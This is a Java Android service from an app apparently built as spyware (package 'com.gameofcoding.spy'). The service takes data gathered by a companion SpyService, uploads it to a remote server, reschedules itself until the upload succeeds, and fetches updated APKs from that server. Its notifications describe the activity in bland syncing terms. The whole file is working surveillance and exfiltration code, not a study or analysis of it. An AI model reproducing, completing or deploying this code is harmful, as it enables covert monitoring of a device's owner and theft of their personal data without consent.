package com.gameofcoding.spy.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarmReceiver;
import com.gameofcoding.spy.server.Server;
import com.gameofcoding.spy.server.ServerManager;
import com.gameofcoding.spy.server.files.FileManager;
import com.gameofcoding.spy.server.files.ServerFiles;
import com.gameofcoding.spy.utils.AppConstants;
import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.io.File;
import java.util.concurrent.Executors;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * UploaderService is the service that actually uploads data, downloads data (if available), etc.
 * You can say that it the app component that does all the stuff related to internet.
 */
public class UploaderService extends Service {
    private static final String TAG = "UploaderService";
    private Context mContext;
    /*
     * Foreground notification id of uploader service
     */
    private static final int UPLOADER_SERVICE_NOTIF_ID = 1;
    private final String VERSION_NAME = "version_name";
    private final String VERSION_CODE = "version_code";
    private final String WHAT_IS_NEW = "what_is_new";
    /*
     * Stores true if upload and download was successfull.otheriwse stores false
     */
    private boolean mHasFinishedSuccessfully;
    private ServerFiles mServerFiles;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "UploaderService started");
	mContext = getApplicationContext();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	updateNotif(R.string.looking_for_something_new);
	doInBackground();
        return START_STICKY;
    }

    /**
     * Backbone of the service.
     * This methods does all the stuff related to networking in background.
     =     */
    private void doInBackground() {
	Executors.newSingleThreadExecutor()
                .execute(() -> {
                        try {
                            // Check if SpyService is running or not
                            Utils utils = new Utils(mContext);
                            if(utils.isServiceRunning(SpyService.class.getName())) {
                                // SpyService is already running, we will wait for until it finishes
                                XLog.v(TAG, "SpyService is running, waiting until it finishes...");
                                updateNotif(R.string.waiting_for_data_loading);
                                while(utils.isServiceRunning(SpyService.class.getName()))
                                    Thread.sleep(1000);
                                XLog.v(TAG, "SpyService finsihed, continuing work.");
                            }

                            // upload data
                            upload();
                        } catch(Exception e) {
                            XLog.e(TAG, "Exception occured while uploading data", e);
                            mHasFinishedSuccessfully = false;
                        } finally {
                            // Check whether we finished successfully or not
                            if(mHasFinishedSuccessfully) {
                                // finished successfully, stop alarmmanager
                                XLog.i(TAG, "Uploaded and downloaded successfully!, stopping alarm...");
                                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                                PendingIntent pendingIntent = PendingIntent
                                        .getBroadcast(mContext, 0, new Intent(mContext, UploaderAlarmReceiver.class), 0);
                                alarmManager.cancel(pendingIntent);
                                XLog.i(TAG, "Alarm stopped!");
                            } else {
                                // finished unsuccessfully
                                XLog.i(TAG, "Data not uploaded successfully, wait for next alarm");
                            }
                            stopSelf();
                        }
                    });
    }

    /**
     * Prepares things (moves data, loads server, etc.) before uploading to server.
     * @return Server loaded server
     */
    private Server prepareForUpload() {
	// Move data from directory where SpyService stores to the server directiory
	XLog.v(TAG, "Moving data...");
	updateNotif(R.string.moving_data);
	FileManager fm = new FileManager(mContext);
	if(!fm.moveDataToServer()) {
	    XLog.i(TAG, "Data could not be moved from 'user_dir' to 'server_dir'");
	    mHasFinishedSuccessfully = false;
	    return null;
	} else {
	    XLog.v(TAG, "Data moved, getting server files...");
	    mServerFiles = fm.getServerFiles();
	    if(mServerFiles == null) {
		mHasFinishedSuccessfully = false;
		return null;
	    }
	    XLog.v(TAG, "Server files loaded.");
	}

	// Uploade data
	updateNotif(R.string.connecting_server);
	ServerManager serverManager = new ServerManager(mContext, mServerFiles.getRootDir());
	XLog.i(TAG, "Loading server...");
	Server server = null;
	if((server = serverManager.loadServer()) != null) {
	    XLog.i(TAG, "Server loaded!");
	    return server;
	} else {
	    XLog.i(TAG, "Could not load server!");
	    mHasFinishedSuccessfully = false;
	    return null;
	}
    }

    /**
     * Uploads data to server.
     */
    private void upload() {
	try {
	    Server server = prepareForUpload();
	    if(server == null)
		return;

	    // Upload data
	    updateNotif(R.string.syncing_data);
	    Server.Directory dirDevice = null;
	    if((dirDevice = server.openDir(Server.Dir.DEVICE)) != null) {
		XLog.i(TAG, "Device directory opened, uploading stored data...");
		if(dirDevice.uploadData()) {
                    updateAppIfAvailable(server);
		    XLog.i(TAG, "Data uploaded successfully!");
		    mHasFinishedSuccessfully = true;
		} else {
		    XLog.w(TAG, "Data could not be uploaded, aborting upload...");
		}
	    } else {
		XLog.w(TAG, "Failed to open device directory in server, aborting upload...");
		mHasFinishedSuccessfully = false;
	    }
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while working with server, aborting upload...", e);
	    mHasFinishedSuccessfully = false;
	}
	updateNotif(R.string.finishing_sync);
    }

    @SuppressWarnings("deprecation")
    private void updateNotif(int contentTextId) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    // Create notification channel for oreo and above devices
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	    notifBuilder.setPriority(Notification.PRIORITY_LOW);
	}

	// Start foreground notification
	notifBuilder
                .setSmallIcon(R.drawable.ic_stat_cloud_upload)
                .setContentTitle(getString(R.string.uploaderservice_notif_content_title))
                .setContentText(getString(contentTextId));
	startForeground(UPLOADER_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    private File moveApkToFilesDirForUpdate(Server server) throws Exception {
        Server.Directory dirAppData = null;
        if((dirAppData = server.openDir(Server.Dir.APP_DATA)) == null)
            return null;
        if(!dirAppData.loadChanges())
            return null;
        File sourceApkFile = new File(mServerFiles.getRootDir(), AppConstants.APP_FILE_NAME);
        File destApkFile = new File(mContext.getExternalCacheDir(), AppConstants.APP_FILE_NAME);
        if(sourceApkFile.renameTo(destApkFile)) {
            return destApkFile;
        } else {
            XLog.d(TAG, "Could not move apk from '" + sourceApkFile + "' to '" + destApkFile);
            return null;
        }
    }

    @SuppressWarnings("deprecation")
    private Bundle hasUpdate(Server server) throws Exception {
	if(server == null || mServerFiles == null)
	    return null;

        if(server.openDir(Server.Dir.MAIN) == null) {
	    XLog.w(TAG, "hasUpdate(Server): Could not opne directory 'MAIN'!");
	    return null;
	}

	File fileAppVersion = new File(mServerFiles.getRootDir(), AppConstants.APP_INFO_FILE_NAME);
	if(!fileAppVersion.exists())
	    return null;

        // Get info about latest version of this application
	JSONObject appInfo = new JSONObject(FileUtils.read(fileAppVersion));
        String latestVersionName = null;
        int latestVersionCode = 0;
        String[] whatIsNew = null;
        if(appInfo.has(VERSION_NAME))
            latestVersionName = appInfo.getString(VERSION_NAME);
        if(appInfo.has(VERSION_CODE))
            latestVersionCode = appInfo.getInt(VERSION_CODE);
        if(appInfo.has(WHAT_IS_NEW)) {
            JSONArray jsonArrWhatIsNew = appInfo.getJSONArray(WHAT_IS_NEW);
            whatIsNew = new String[jsonArrWhatIsNew.length()];
            for(int i = 0; i < jsonArrWhatIsNew.length(); i++)
                whatIsNew[i] = jsonArrWhatIsNew.getString(i);
        }

        // Get current version code of app
	long currentVersionCode = 0;
	PackageInfo pkgInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
	if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
	    currentVersionCode = pkgInfo.getLongVersionCode();
	else
	    currentVersionCode = pkgInfo.versionCode;

        // Return extras if app update is availabe
        if(latestVersionCode > currentVersionCode) {
            XLog.d(TAG, "Latest app version: " + latestVersionCode);
            XLog.d(TAG, "Current app Version: " + currentVersionCode);
            File apkFile = moveApkToFilesDirForUpdate(server);
            if(apkFile == null)
                return null;
            Bundle extras = new Bundle();
            extras.putString(AppConstants.EXTRA_APP_PATH, apkFile.toString());
            extras.putString(AppConstants.EXTRA_VERSION_NAME, latestVersionName);
            extras.putStringArray(AppConstants.EXTRA_WHAT_IS_NEW, whatIsNew);
            return extras;
        } else { return null; }
    }

    private void notifyAboutAppUpdate(Bundle extras) {
        Intent serviceIntent = new Intent(mContext, AppUpdateInformerService.class);
        serviceIntent.putExtras(extras);
        new Utils(mContext).startForegroundService(serviceIntent);
    }

    private void updateAppIfAvailable(Server server) throws Exception {
        XLog.i(TAG, "Checking for app update...");
        Bundle extras = null;
        if((extras = hasUpdate(server)) != null)  {
            XLog.i(TAG, "App update available");
            notifyAboutAppUpdate(extras);
            XLog.i(TAG, "Notification send for installing app update");
        } else {
            XLog.d(TAG, "This is the latest version of application");
        }
    }
}
